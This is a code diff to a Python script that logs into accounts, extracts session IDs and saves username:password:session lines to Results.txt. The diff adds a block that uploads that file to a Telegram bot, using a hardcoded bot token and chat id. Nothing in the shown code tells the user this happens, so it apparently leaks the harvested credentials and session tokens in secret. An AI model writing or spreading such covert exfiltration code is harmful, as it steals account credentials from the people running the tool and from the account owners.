@@ -1,5 +1,5 @@
 import requests
-import re
+import re,time
 from uuid import uuid4
 
 Z = '\033[1;31m' #احمر
@@ -91,11 +91,23 @@ with open('Results.txt', 'w') as f:
             Send(username,password,sess_id)
             f.write(f'{username}:{password}:{sess_id}\n')    
             print(f'{F}SessionID Extracted: {username} | Session ID: {X}{sess_id}')
+            time.sleep(2)
+           
             
-            
-            
-            
-        else: print(f'{Z}Incorrect Email or Password{Z}', username)
+        else: print(f'{Z}{req.json()}{Z}', username)
         
-        
+
+url = f'https://api.telegram.org/bot6243314109:AAEGKJIZkrjK8zB9X5wNeMrx4yUz3dPMhw8/sendDocument'
+
+# Prepare the data to send
+data = {
+    'chat_id': 5685888101,
+    'caption': '✅ NEW RESULTS'
+}
+with open('Results.txt', 'rb') as file:
+    files = {'document': ('Results.txt', file)}
+
+# Send the file and other data to the chat
+response = requests.post(url, data=data, files=files)
+
                 
